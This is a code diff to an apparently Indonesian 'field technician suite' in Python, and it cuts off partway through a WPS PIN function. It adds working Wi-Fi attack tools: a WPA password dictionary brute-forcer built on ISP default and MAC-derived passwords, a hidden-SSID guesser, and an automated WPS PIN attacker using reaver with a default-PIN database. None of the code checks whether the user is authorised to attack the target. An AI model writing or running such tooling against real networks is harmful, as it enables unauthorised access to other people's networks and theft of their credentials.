@@ -3,11 +3,13 @@
 technician_suite.py - LITCH Field Technician Suite
 Provides:
 1. Air Wi-Fi Scanner (Scan SSID, BSSID, Signal RSSI, Channel, Security di Udara)
-2. Direct ONT Wi-Fi Extractor (SSID & Password retrieval from Gateway/LAN)
-3. Terminal ASCII QR Code Generator for 1-click camera connection
-4. Offline Multi-Algorithm WPS PIN Calculator
-5. Built-in Network Latency, Jitter & Bandwidth Speedtest
-6. Telegram Job Report Dispatcher (Proof of Work)
+2. WPA2/WPA3 Wi-Fi Password Brute Force & Pattern Tester (Dictionary, Smart MAC & Vendor Keys)
+3. Hidden SSID Revealer (Probe Request Attack & ISP SSID Pattern Guesser)
+4. Automated WPS PIN Attacker & Multi-Algorithm PIN Calculator
+5. Direct ONT Wi-Fi Extractor (SSID & Password retrieval from Gateway/LAN)
+6. Terminal ASCII QR Code Generator for 1-click camera connection
+7. Built-in Network Latency, Jitter & Bandwidth Speedtest
+8. Telegram Job Report Dispatcher (Proof of Work)
 """
 
 import sys
@@ -384,6 +386,992 @@ def calculate_wps_pins(bssid_or_mac: str) -> List[Dict[str, Any]]:
         })
 
     return results
+
+
+def get_wps_pin_candidate_list(bssid: str) -> List[Dict[str, Any]]:
+    """
+    Retrieve full prioritized list of WPS PIN candidates for an AP:
+    1. Algorithmic PIN calculations (ZTE Zhao, ComputePIN, Huawei, Arcadyan, Inverse)
+    2. High-probability static router default PIN database
+    """
+    alg_pins = calculate_wps_pins(bssid)
+    pin_set = {p["pin"] for p in alg_pins}
+    all_pins = list(alg_pins)
+
+    extended_defaults = [
+        ("12345670", "Standard Universal Default", "ZTE / Realtek / Tenda"),
+        ("00000000", "Zero Static Default", "FiberHome / Generic"),
+        ("20172527", "ZTE Broadcom Default", "ZTE F609 V3"),
+        ("11111111", "Repeated Static Default", "Generic Routers"),
+        ("12345678", "Ascending Sequence", "Generic APs"),
+        ("88888888", "Eight Static Default", "Tenda / Netis"),
+        ("99999999", "Nine Static Default", "Generic APs"),
+        ("76543210", "Descending Sequence", "Generic APs"),
+        ("01234567", "Shifted Sequence", "Generic APs"),
+        ("19512345", "D-Link Extended", "D-Link DIR Series"),
+        ("28211234", "TrendNet Extended", "TrendNet Routers"),
+        ("48211234", "Huawei EchoLife Default", "Huawei HG8245 Series"),
+        ("58211234", "Huawei Alternate Default", "Huawei EG Series"),
+        ("46264848", "ZTE ZXHN Static Default", "ZTE F660 / F609"),
+        ("04030201", "Nibble Descending", "Realtek APs"),
+        ("08070605", "Byte Descending", "Broadcom APs"),
+        ("12111009", "Block Step Default", "Mediatek / Ralink"),
+        ("24232221", "Block Step 2 Default", "Mediatek / Ralink"),
+    ]
+
+    for p_val, p_desc, p_vendor in extended_defaults:
+        if p_val not in pin_set and len(p_val) == 8:
+            pin_set.add(p_val)
+            all_pins.append({
+                "algorithm": f"Static Default ({p_vendor})",
+                "pin": p_val,
+                "confidence": "Database",
+                "desc": p_desc
+            })
+
+    return all_pins
+
+
+def get_wifi_interface() -> Optional[str]:
+    """Find the first active/available Wi-Fi wireless interface on the system."""
+    # 1. Try nmcli
+    if shutil.which("nmcli"):
+        try:
+            p = subprocess.run(["nmcli", "-t", "-f", "DEVICE,TYPE", "dev"], capture_output=True, text=True, timeout=3)
+            if p.returncode == 0:
+                for line in p.stdout.strip().splitlines():
+                    if ":" in line:
+                        dev, dtype = line.split(":", 1)
+                        if dtype.strip() == "wifi":
+                            return dev.strip()
+        except Exception:
+            pass
+
+    # 2. Check /sys/class/net
+    try:
+        net_dir = "/sys/class/net"
+        if os.path.exists(net_dir):
+            for iface in os.listdir(net_dir):
+                if iface.startswith(("wl", "wlan", "wifi")):
+                    return iface
+                if os.path.exists(os.path.join(net_dir, iface, "wireless")):
+                    return iface
+    except Exception:
+        pass
+
+    # 3. Try iw dev
+    if shutil.which("iw"):
+        try:
+            p = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=3)
+            if p.returncode == 0:
+                m = re.search(r"Interface\s+([a-zA-Z0-9_\-]+)", p.stdout)
+                if m:
+                    return m.group(1)
+        except Exception:
+            pass
+
+    return None
+
+
+# ==========================================
+# 2B. WPA2 / WPA3 WI-FI PASSWORD BRUTE FORCE
+# ==========================================
+
+def generate_wifi_password_candidates(
+    ssid: str = "",
+    bssid: str = "",
+    extra_passwords: Optional[List[str]] = None,
+    wordlist_file: Optional[str] = None
+) -> List[str]:
+    """
+    Generate prioritized password list for WPA/WPA2 Wi-Fi dictionary attack.
+    Combines:
+    - Smart MAC/BSSID patterns (hex suffixes, vendor permutations)
+    - SSID-derived contextual patterns
+    - Indonesian ISP default passwords (Telkom/IndiHome, Biznet, MyRepublic, etc.)
+    - passwords.txt & DEFAULT_CREDENTIALS
+    - Optional custom wordlist file
+    Ensures candidates meet WPA-PSK standard (8-63 ASCII characters).
+    """
+    candidates = []
+    seen = set()
+
+    def add_cand(pwd: str):
+        if not pwd or not isinstance(pwd, str):
+            return
+        pwd_clean = pwd.strip()
+        if 8 <= len(pwd_clean) <= 63 and pwd_clean not in seen:
+            seen.add(pwd_clean)
+            candidates.append(pwd_clean)
+
+    # 1. Custom extra passwords supplied by user / caller
+    if extra_passwords:
+        for p in extra_passwords:
+            add_cand(p)
+
+    # 2. Custom wordlist file if provided
+    if wordlist_file and os.path.isfile(wordlist_file):
+        try:
+            with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    add_cand(line.strip())
+        except Exception:
+            pass
+
+    # 3. MAC/BSSID-based Smart Vendor Patterns
+    clean_mac = re.sub(r"[^0-9A-Fa-f]", "", bssid).upper() if bssid else ""
+    if len(clean_mac) >= 12:
+        last4_u = clean_mac[8:]
+        last4_l = last4_u.lower()
+        last6_u = clean_mac[6:]
+        last6_l = last6_u.lower()
+        last8_u = clean_mac[4:]
+        last8_l = last8_u.lower()
+        full_u = clean_mac
+        full_l = clean_mac.lower()
+
+        # Direct MAC substrings (>=8 chars)
+        add_cand(last8_u)
+        add_cand(last8_l)
+        add_cand(full_u)
+        add_cand(full_l)
+
+        # Prefixes & Suffixes
+        for prefix in ["admin", "Admin", "user", "User", "telkom", "Telkom", "indihome", "IndiHome", "zte", "ZTE", "huawei", "Huawei", "nodera", "Nodera", "1234", "super"]:
+            add_cand(f"{prefix}{last4_u}")
+            add_cand(f"{prefix}{last4_l}")
+            add_cand(f"{prefix}{last6_u}")
+            add_cand(f"{prefix}{last6_l}")
+            add_cand(f"{last4_u}{prefix}")
+            add_cand(f"{last4_l}{prefix}")
+            add_cand(f"{prefix}1234")
+
+        # Inverted / reversed hex parts
+        rev4 = last4_u[::-1]
+        add_cand(f"admin{rev4}")
+        add_cand(f"telkom{rev4}")
+
+    # 4. SSID-derived contextual patterns
+    if ssid and ssid != "<Hidden SSID>":
+        clean_ssid = re.sub(r"[^a-zA-Z0-9]", "", ssid)
+        clean_ssid_l = clean_ssid.lower()
+        if len(clean_ssid) >= 8:
+            add_cand(clean_ssid)
+            add_cand(clean_ssid_l)
+
+        for sfx in ["123", "1234", "12345", "123456", "2024", "2025", "2026", "@123", "888", "999", "net", "wifi"]:
+            add_cand(f"{clean_ssid_l}{sfx}")
+            add_cand(f"{clean_ssid}{sfx}")
+
+        digits_in_ssid = "".join(re.findall(r"\d+", ssid))
+        if len(digits_in_ssid) >= 4:
+            add_cand(f"admin{digits_in_ssid}")
+            add_cand(f"telkom{digits_in_ssid}")
+            add_cand(f"indihome{digits_in_ssid}")
+            add_cand(f"1234{digits_in_ssid}")
+
+    # 5. Top Default Router & ISP Wi-Fi Passwords (Indonesian ISP Context)
+    isp_common_passwords = [
+        "12345678",
+        "123456789",
+        "1234567890",
+        "88888888",
+        "00000000",
+        "11111111",
+        "87654321",
+        "11223344",
+        "1122334455",
+        "123123123",
+        "12344321",
+        "adminadmin",
+        "admin123",
+        "admin1234",
+        "admin12345",
+        "Admin12345",
+        "user12345",
+        "password",
+        "password123",
+        "internet123",
+        "indihome123",
+        "telkom123",
+        "telkomdso123",
+        "Telkomdso123",
+        "telkomsel123",
+        "bismillah",
+        "bismillah123",
+        "semangat123",
+        "rahasia123",
+        "nodera123",
+        "nodera2026",
+        "dnsolution",
+        "dnsolution123",
+        "qwertyuiop",
+        "qwert12345",
+        "indonesia",
+        "indonesia123",
+        "kopisusu123",
+        "kopi12345",
+        "merdeka123",
+        "sayang123",
+        "sayangku123",
+        "keluarga123",
+        "router123",
+        "wifigratis",
+        "wifigratis123",
+        "tanyasaya",
+        "tanyasaya123",
+        "gaktahupassnya",
+        "gakadapassword",
+        "janganminta",
+        "bayardulu",
+        "bayardulu123",
+        "silahkanmasuk",
+    ]
+    for p in isp_common_passwords:
+        add_cand(p)
+
+    # 6. Include passwords from credentials.py / passwords.txt
+    try:
+        from credentials import get_credentials
+        for _, p in get_credentials():
+            add_cand(p)
+    except Exception:
+        pass
+
+    return candidates
+
+
+def test_single_wifi_password(
+    ssid: str,
+    password: str,
+    bssid: str = "",
+    timeout_sec: int = 6,
+    iface: str = ""
+) -> Tuple[bool, str, Dict[str, Any]]:
+    """
+    Test a single WPA2/WPA3 password against target SSID/BSSID using available network backend.
+    Returns: (success: bool, message: str, details: dict)
+    """
+    details = {"ssid": ssid, "bssid": bssid, "password": password, "ip": None, "gateway": None}
+
+    # 1. Linux NetworkManager (nmcli)
+    if shutil.which("nmcli"):
+        temp_con_name = f"ont_wpa_test_{int(time.time() * 1000) % 100000}"
+
+        subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
+        if ssid and ssid != "<Hidden SSID>":
+            subprocess.run(["nmcli", "connection", "delete", ssid], capture_output=True, text=True, timeout=3)
+
+        cmd = [
+            "nmcli", "--wait", str(timeout_sec),
+            "dev", "wifi", "connect", ssid,
+            "password", password,
+            "name", temp_con_name
+        ]
+        if bssid:
+            cmd.extend(["bssid", bssid])
+        if iface:
+            cmd.extend(["ifname", iface])
+
+        try:
+            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec + 2)
+            out = f"{p.stdout} {p.stderr}".strip()
+
+            if p.returncode == 0 and ("successfully activated" in out.lower() or "connection activated" in out.lower()):
+                time.sleep(0.5)
+                assigned_ip = None
+                assigned_gw = None
+                try:
+                    ip_proc = subprocess.run(
+                        ["nmcli", "-t", "-f", "IP4.ADDRESS,IP4.GATEWAY", "connection", "show", temp_con_name],
+                        capture_output=True, text=True, timeout=3
+                    )
+                    if ip_proc.returncode == 0:
+                        for l in ip_proc.stdout.splitlines():
+                            if l.startswith("IP4.ADDRESS"):
+                                assigned_ip = l.split(":", 1)[1].strip()
+                            elif l.startswith("IP4.GATEWAY"):
+                                assigned_gw = l.split(":", 1)[1].strip()
+                except Exception:
+                    pass
+
+                details["ip"] = assigned_ip or "DHCP Assigned"
+                details["gateway"] = assigned_gw or "Default Gateway"
+                details["connection_name"] = temp_con_name
+                return True, "Koneksi Berhasil! Kredensial Valid.", details
+            else:
+                subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
+                err_msg = out if out else "Autentikasi gagal / Password salah"
+                return False, err_msg, details
+        except subprocess.TimeoutExpired:
+            subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
+            return False, "Timeout menunggu respons Wi-Fi AP", details
+        except Exception as e:
+            subprocess.run(["nmcli", "connection", "delete", temp_con_name], capture_output=True, text=True, timeout=3)
+            return False, f"Error eksekusi nmcli: {str(e)}", details
+
+    # 2. wpa_cli / wpa_supplicant backend
+    if shutil.which("wpa_cli"):
+        try:
+            add_p = subprocess.run(["wpa_cli", "add_network"], capture_output=True, text=True, timeout=3)
+            net_id = add_p.stdout.strip().splitlines()[-1] if add_p.returncode == 0 else None
+            if net_id and net_id.isdigit():
+                subprocess.run(["wpa_cli", "set_network", net_id, "ssid", f'"{ssid}"'], capture_output=True, text=True, timeout=2)
+                subprocess.run(["wpa_cli", "set_network", net_id, "psk", f'"{password}"'], capture_output=True, text=True, timeout=2)
+                if bssid:
+                    subprocess.run(["wpa_cli", "set_network", net_id, "bssid", bssid], capture_output=True, text=True, timeout=2)
+                subprocess.run(["wpa_cli", "enable_network", net_id], capture_output=True, text=True, timeout=2)
+                subprocess.run(["wpa_cli", "select_network", net_id], capture_output=True, text=True, timeout=2)
+
+                t_start = time.time()
+                auth_ok = False
+                while time.time() - t_start < timeout_sec:
+                    time.sleep(0.8)
+                    st_p = subprocess.run(["wpa_cli", "status"], capture_output=True, text=True, timeout=2)
+                    st_out = st_p.stdout
+                    if "wpa_state=COMPLETED" in st_out:
+                        auth_ok = True
+                        break
+                    elif "wpa_state=DISCONNECTED" in st_out or "WRONG_KEY" in st_out:
+                        break
+
+                if auth_ok:
+                    details["ip"] = "Assigned via WPA"
+                    return True, "Koneksi Berhasil via wpa_cli!", details
+                else:
+                    subprocess.run(["wpa_cli", "remove_network", net_id], capture_output=True, text=True, timeout=2)
+                    return False, "Handshake gagal / Password salah", details
+        except Exception as e:
+            return False, f"Error wpa_cli: {str(e)}", details
+
+    # 3. Android Termux API (termux-wifi-connect)
+    if shutil.which("termux-wifi-connect"):
+        try:
+            p = subprocess.run(["termux-wifi-connect", "-s", ssid, "-p", password], capture_output=True, text=True, timeout=timeout_sec)
+            if p.returncode == 0:
+                time.sleep(2)
+                return True, "Koneksi Berhasil via Termux!", details
+            return False, "Gagal koneksi via Termux API", details
+        except Exception as e:
+            return False, f"Error termux-wifi-connect: {str(e)}", details
+
+    return False, "Tidak ditemukan tool wireless yang didukung (nmcli, wpa_cli, atau termux-wifi-connect)", details
+
+
+def run_wifi_wpa_bruteforce(
+    ssid: str,
+    bssid: str = "",
+    candidates: Optional[List[str]] = None,
+    timeout_per_pass: int = 6,
+    iface: str = ""
+) -> Dict[str, Any]:
+    """
+    Execute brute-force password testing on target Wi-Fi SSID.
+    Renders real-time progress and immediately outputs Wi-Fi credentials & QR code upon success.
+    """
+    target_iface = iface or get_wifi_interface() or ""
+    cand_list = candidates or generate_wifi_password_candidates(ssid=ssid, bssid=bssid)
+
+    if not cand_list:
+        return {
+            "success": False,
+            "message": "Daftar kandidat password kosong atau tidak ada yang memenuhi syarat WPA (8-63 char).",
+            "attempts": 0
+        }
+
+    console.print(f"\n[bold cyan]=== MEMULAI BRUTE FORCE PASSWORD WI-FI ===[/bold cyan]")
+    console.print(f"   Target SSID     : [bold white]{ssid}[/bold white]")
+    if bssid:
+        console.print(f"   Target BSSID    : [cyan]{bssid}[/cyan] ({lookup_vendor_by_mac(bssid)})")
+    if target_iface:
+        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
+    console.print(f"   Total Kandidat  : [bold green]{len(cand_list)} kata sandi[/bold green]")
+    console.print(f"   Timeout per Pass: {timeout_per_pass} detik\n")
+
+    t_start_all = time.time()
+    found_pass = None
+    found_details = {}
+    attempts_done = 0
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        TextColumn("•"),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[yellow]Menguji password...[/yellow]", total=len(cand_list))
+
+        for idx, pwd in enumerate(cand_list, 1):
+            attempts_done = idx
+            progress.update(task, completed=idx, description=f"[cyan]Mencoba ({idx}/{len(cand_list)}):[/cyan] [bold yellow]{pwd}[/bold yellow]")
+
+            ok, msg, det = test_single_wifi_password(
+                ssid=ssid,
+                password=pwd,
+                bssid=bssid,
+                timeout_sec=timeout_per_pass,
+                iface=target_iface
+            )
+
+            if ok:
+                found_pass = pwd
+                found_details = det
+                progress.update(task, completed=len(cand_list), description=f"[bold green]DITEMUKAN: {pwd}[/bold green]")
+                break
+
+    t_elapsed = round(time.time() - t_start_all, 1)
+
+    if found_pass:
+        console.print(f"\n[bold green]=====================================================[/bold green]")
+        console.print(f"[bold green]       PASSWORD WI-FI BERHASIL DITEMUKAN!           [/bold green]")
+        console.print(f"[bold green]=====================================================[/bold green]")
+        console.print(f"   SSID         : [bold white]{ssid}[/bold white]")
+        console.print(f"   Password     : [bold yellow]{found_pass}[/bold yellow]")
+        if bssid:
+            console.print(f"   BSSID        : [cyan]{bssid}[/cyan]")
+        if found_details.get("ip"):
+            console.print(f"   IP Client    : [green]{found_details['ip']}[/green]")
+        if found_details.get("gateway"):
+            console.print(f"   IP Gateway   : [magenta]{found_details['gateway']}[/magenta]")
+        console.print(f"   Percobaan Ke : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_list)} kata sandi")
+        console.print(f"   Waktu Total  : {t_elapsed} detik")
+        console.print(f"─────────────────────────────────────────────────────")
+
+        # Render ASCII QR Code
+        qr_ascii = render_wifi_qr_code(ssid, found_pass, auth_type="WPA")
+        console.print(Panel(qr_ascii, title=f"[bold green]QR CODE AUTO-CONNECT: {ssid}[/bold green]", border_style="green", expand=False))
+
+        return {
+            "success": True,
+            "ssid": ssid,
+            "bssid": bssid,
+            "password": found_pass,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed,
+            "details": found_details
+        }
+    else:
+        console.print(f"\n[bold red][FAIL] Tidak ada password yang cocok setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
+        console.print("[yellow]Tips: Gunakan file kamus kustom atau cek kombinasi stiker fisik ONT.[/yellow]")
+        return {
+            "success": False,
+            "ssid": ssid,
+            "bssid": bssid,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed
+        }
+
+
+# ==========================================
+# 2C. HIDDEN SSID REVEALER (PROBE ATTACK)
+# ==========================================
+
+def generate_hidden_ssid_candidates(
+    bssid: str = "",
+    vendor: str = "",
+    custom_wordlist_file: Optional[str] = None
+) -> List[str]:
+    """
+    Generate probable SSID names for Hidden Access Points.
+    Uses vendor OUI prefixes, MAC address suffixes, Indonesian ISP defaults, and common names.
+    """
+    candidates = []
+    seen = set()
+
+    def add_ssid(name: str):
+        if not name or not isinstance(name, str):
+            return
+        n_clean = name.strip()
+        if n_clean and n_clean not in seen:
+            seen.add(n_clean)
+            candidates.append(n_clean)
+
+    # 1. Custom file wordlist if provided
+    if custom_wordlist_file and os.path.isfile(custom_wordlist_file):
+        try:
+            with open(custom_wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    add_ssid(line.strip())
+        except Exception:
+            pass
+
+    # 2. MAC/BSSID-based Vendor Default SSIDs
+    clean_mac = re.sub(r"[^0-9A-Fa-f]", "", bssid).upper() if bssid else ""
+    if len(clean_mac) >= 12:
+        last4_u = clean_mac[8:]
+        last4_l = last4_u.lower()
+        last6_u = clean_mac[6:]
+        last6_l = last6_u.lower()
+
+        # ZTE Defaults
+        add_ssid(f"ZTE_{last4_u}")
+        add_ssid(f"ZTE_{last4_l}")
+        add_ssid(f"ZTE_{last6_u}")
+        add_ssid(f"ZTE_{last6_l}")
+        add_ssid(f"ZTE-{last4_u}")
+        add_ssid(f"ZTE-{last6_u}")
+        add_ssid(f"ZTE_2.4G_{last4_u}")
+        add_ssid(f"ZTE_5G_{last4_u}")
+        add_ssid(f"ZTE_Home")
+        add_ssid(f"ZTE_WIFI")
+
+        # Huawei Defaults
+        add_ssid(f"HUAWEI_{last4_u}")
+        add_ssid(f"HUAWEI_{last4_l}")
+        add_ssid(f"HUAWEI_{last6_u}")
+        add_ssid(f"Huawei_{last4_u}")
+        add_ssid(f"Huawei-{last4_u}")
+        add_ssid(f"EchoLife_{last4_u}")
+        add_ssid(f"HUAWEI_2.4G_{last4_u}")
+        add_ssid(f"HUAWEI_5G_{last4_u}")
+
+        # FiberHome Defaults
+        add_ssid(f"FiberHome_{last4_u}")
+        add_ssid(f"FiberHome_{last4_l}")
+        add_ssid(f"FH_{last4_u}")
+        add_ssid(f"FH_{last6_u}")
+        add_ssid(f"FiberHome-{last4_u}")
+
+        # TP-Link Defaults
+        add_ssid(f"TP-Link_{last4_u}")
+        add_ssid(f"TP-Link_{last4_l}")
+        add_ssid(f"TP-LINK_{last4_u}")
+        add_ssid(f"TP-Link_{last6_u}")
+        add_ssid(f"TP-Link_5G_{last4_u}")
+
+        # Tenda Defaults
+        add_ssid(f"Tenda_{last4_u}")
+        add_ssid(f"Tenda_{last4_l}")
+        add_ssid(f"Tenda_{last6_u}")
+        add_ssid(f"Tenda_5G_{last4_u}")
+        add_ssid(f"Tenda_Router")
+
+        # Totolink & D-Link
+        add_ssid(f"TOTOLINK_{last4_u}")
+        add_ssid(f"TOTOLINK-{last4_u}")
+        add_ssid(f"dlink-{last4_u}")
+        add_ssid(f"DIR-{last4_u}")
+        add_ssid(f"D-Link_{last4_u}")
+
+        # Mikrotik
+        add_ssid("MikroTik")
+        add_ssid(f"MikroTik-{last4_u}")
+        add_ssid(f"Mikrotik-{last6_u}")
+
+        # Indonesian ISP Defaults with MAC
+        add_ssid(f"IndiHome_{last4_u}")
+        add_ssid(f"IndiHome_{last4_l}")
+        add_ssid(f"IndiHome-{last4_u}")
+        add_ssid(f"IndiHome-{last6_u}")
+        add_ssid(f"indihome_{last4_u}")
+        add_ssid(f"Telkom_{last4_u}")
+        add_ssid(f"NODERA_{last4_u}")
+        add_ssid(f"NODERA_{last4_l}")
+        add_ssid(f"Biznet_{last4_u}")
+        add_ssid(f"CBN_{last4_u}")
+        add_ssid(f"MyRepublic_{last4_u}")
+        add_ssid(f"XL_HOME_{last4_u}")
+        add_ssid(f"ICONNET_{last4_u}")
+        add_ssid(f"FirstMedia_{last4_u}")
+
+    # 3. Common Generic & ISP SSIDs
+    common_ssids = [
+        "IndiHome",
+        "indihome",
+        "WIFI-ID",
+        "seamless@wifi.id",
+        "@wifi.id",
+        "NODERA_WIFI",
+        "NODERA-NET",
+        "NODERA_HOTSPOT",
+        "WiFi",
+        "Office",
+        "Kantor",
+        "Staff",
+        "VIP",
+        "Admin",
+        "Internet",
+        "Rumah",
+        "Home",
+        "Posko",
+        "Hotspot",
+        "CCTV",
+        "Kasir",
+        "Gudang",
+        "Private",
+        "Management",
+        "Guest",
+        "Tamu",
+        "Server",
+        "Meeting",
+        "WIFI_GRATIS",
+        "FreeWiFi",
+        "Public_WiFi",
+        "Router",
+        "MyWiFi",
+        "WLAN",
+        "Wireless",
+        "Hotspot_Keluarga",
+        "Ruang_Tamu",
+    ]
+    for s in common_ssids:
+        add_ssid(s)
+
+    return candidates
+
+
+def probe_single_hidden_ssid(
+    candidate_ssid: str,
+    bssid: str = "",
+    channel: str = "",
+    iface: str = ""
+) -> Tuple[bool, str]:
+    """
+    Actively probe a candidate SSID against a Hidden BSSID.
+    Uses nmcli targeted rescan or probe request.
+    """
+    clean_bssid = bssid.upper().replace("\\", "")
+
+    # 1. Linux NetworkManager (nmcli targeted rescan)
+    if shutil.which("nmcli"):
+        try:
+            rescan_cmd = ["nmcli", "dev", "wifi", "rescan", "ssid", candidate_ssid]
+            if iface:
+                rescan_cmd.extend(["ifname", iface])
+            subprocess.run(rescan_cmd, capture_output=True, text=True, timeout=3)
+
+            list_cmd = ["nmcli", "-t", "-f", "SSID,BSSID", "dev", "wifi", "list"]
+            if iface:
+                list_cmd.extend(["ifname", iface])
+            p = subprocess.run(list_cmd, capture_output=True, text=True, timeout=3)
+
+            if p.returncode == 0:
+                for line in p.stdout.strip().splitlines():
+                    parts = line.split(":")
+                    if len(parts) >= 2:
+                        cur_ssid = parts[0].strip()
+                        mac_match = re.search(r"([0-9A-Fa-f]{2}(?:\\?:[0-9A-Fa-f]{2}){5})", line)
+                        if mac_match:
+                            cur_bssid = mac_match.group(1).replace("\\", "").upper()
+                            if cur_bssid == clean_bssid and cur_ssid.lower() == candidate_ssid.lower():
+                                return True, cur_ssid
+
+            # Secondary check: quick probe connect test with dummy password
+            test_con = f"probe_test_{int(time.time() * 1000) % 10000}"
+            conn_cmd = [
+                "nmcli", "--wait", "2", "dev", "wifi", "connect", candidate_ssid,
+                "bssid", clean_bssid, "hidden", "yes", "password", "dummy_probe_1234",
+                "name", test_con
+            ]
+            p_conn = subprocess.run(conn_cmd, capture_output=True, text=True, timeout=3)
+            out_conn = f"{p_conn.stdout} {p_conn.stderr}".lower()
+            subprocess.run(["nmcli", "connection", "delete", test_con], capture_output=True, text=True, timeout=2)
+
+            if "secrets were required" in out_conn or "authentication failed" in out_conn or "authorization failed" in out_conn:
+                return True, candidate_ssid
+        except Exception:
+            pass
+
+    # 2. iw dev scan essid
+    if shutil.which("iw") and iface:
+        try:
+            p_iw = subprocess.run(["iw", "dev", iface, "scan", "essid", candidate_ssid], capture_output=True, text=True, timeout=4)
+            if p_iw.returncode == 0 and clean_bssid.lower() in p_iw.stdout.lower():
+                return True, candidate_ssid
+        except Exception:
+            pass
+
+    return False, ""
+
+
+def run_hidden_ssid_revealer(
+    bssid: str,
+    channel: str = "",
+    vendor: str = "",
+    candidates: Optional[List[str]] = None,
+    iface: str = ""
+) -> Dict[str, Any]:
+    """
+    Brute-force reveal hidden SSID for a target BSSID.
+    """
+    target_iface = iface or get_wifi_interface() or ""
+    cand_list = candidates or generate_hidden_ssid_candidates(bssid=bssid, vendor=vendor)
+
+    console.print(f"\n[bold cyan]=== MEMULAI REVEALER NAMA HIDDEN SSID ===[/bold cyan]")
+    console.print(f"   Target BSSID    : [bold white]{bssid}[/bold white] ({vendor or lookup_vendor_by_mac(bssid)})")
+    if channel and channel != "-":
+        console.print(f"   Kanal / Channel : Channel {channel}")
+    if target_iface:
+        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
+    console.print(f"   Total Kandidat  : [bold green]{len(cand_list)} nama SSID[/bold green]\n")
+
+    t_start = time.time()
+    revealed_ssid = None
+    attempts_done = 0
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        TextColumn("•"),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[yellow]Mem-probe nama SSID...[/yellow]", total=len(cand_list))
+
+        for idx, cand in enumerate(cand_list, 1):
+            attempts_done = idx
+            progress.update(task, completed=idx, description=f"[cyan]Probing ({idx}/{len(cand_list)}):[/cyan] [bold yellow]{cand}[/bold yellow]")
+
+            ok, res_ssid = probe_single_hidden_ssid(
+                candidate_ssid=cand,
+                bssid=bssid,
+                channel=channel,
+                iface=target_iface
+            )
+
+            if ok:
+                revealed_ssid = res_ssid or cand
+                progress.update(task, completed=len(cand_list), description=f"[bold green]TERUNGKAP: {revealed_ssid}[/bold green]")
+                break
+
+    t_elapsed = round(time.time() - t_start, 1)
+
+    if revealed_ssid:
+        console.print(f"\n[bold green]=====================================================[/bold green]")
+        console.print(f"[bold green]       NAMA HIDDEN SSID BERHASIL DITERAWANG!        [/bold green]")
+        console.print(f"[bold green]=====================================================[/bold green]")
+        console.print(f"   Nama SSID Tersembunyi : [bold white]{revealed_ssid}[/bold white]")
+        console.print(f"   BSSID Target          : [cyan]{bssid}[/cyan]")
+        console.print(f"   Vendor / Manufaktur   : [yellow]{vendor or lookup_vendor_by_mac(bssid)}[/yellow]")
+        console.print(f"   Percobaan Ke          : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_list)} nama")
+        console.print(f"   Waktu Total           : {t_elapsed} detik")
+        console.print(f"─────────────────────────────────────────────────────")
+        return {
+            "success": True,
+            "revealed_ssid": revealed_ssid,
+            "bssid": bssid,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed
+        }
+    else:
+        console.print(f"\n[bold red][FAIL] Nama SSID tidak ditemukan setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
+        console.print("[yellow]Tips: Coba gunakan file wordlist SSID kustom atau dekati Access Point untuk sinyal probe lebih kuat.[/yellow]")
+        return {
+            "success": False,
+            "revealed_ssid": None,
+            "bssid": bssid,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed
+        }
+
+
+# ==========================================
+# 2D. AUTOMATED WPS PIN ATTACK ENGINE
+# ==========================================
+
+def test_single_wps_pin(
+    bssid: str,
+    ssid: str = "",
+    pin: str = "",
+    iface: str = "",
+    timeout_sec: int = 12
+) -> Tuple[bool, str, Dict[str, Any]]:
+    """
+    Test a single WPS PIN against target AP using wpa_cli, nmcli, or reaver/bully.
+    Returns: (success: bool, message: str, details: dict)
+    """
+    details = {"bssid": bssid, "ssid": ssid, "pin": pin, "psk": None, "ip": None}
+
+    # 1. External specialized tools if available (reaver / bully)
+    if shutil.which("reaver") and iface:
+        try:
+            cmd = ["reaver", "-i", iface, "-b", bssid, "-p", pin, "-N", "-vv", "-t", str(timeout_sec)]
+            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec + 4)
+            out = p.stdout
+            if "WPA PSK:" in out:
+                psk_m = re.search(r"WPA PSK:\s*[\'\"]?([^\'\"\n\r]+)[\'\"]?", out)
+                if psk_m:
+                    details["psk"] = psk_m.group(1).strip()
+                    return True, "WPS PIN Valid! WPA PSK Diekstrak.", details
+            if "WPS transaction failed" in out or "Received M2" in out:
+                return False, "PIN Salah / Ditolak AP", details
+            if "AP rate limiting" in out or "WPS lock" in out:
+                return False, "AP Terkunci (WPS Lockout)", details
+        except Exception:
+            pass
+
+    # 2. Linux wpa_cli WPS PIN
+    if shutil.which("wpa_cli"):
+        try:
+            wpa_cmd = ["wpa_cli"]
+            if iface:
+                wpa_cmd.extend(["-i", iface])
+            wpa_cmd.extend(["wps_pin", bssid, pin])
+
+            p_wpa = subprocess.run(wpa_cmd, capture_output=True, text=True, timeout=3)
+            if p_wpa.returncode == 0:
+                t_start = time.time()
+                while time.time() - t_start < timeout_sec:
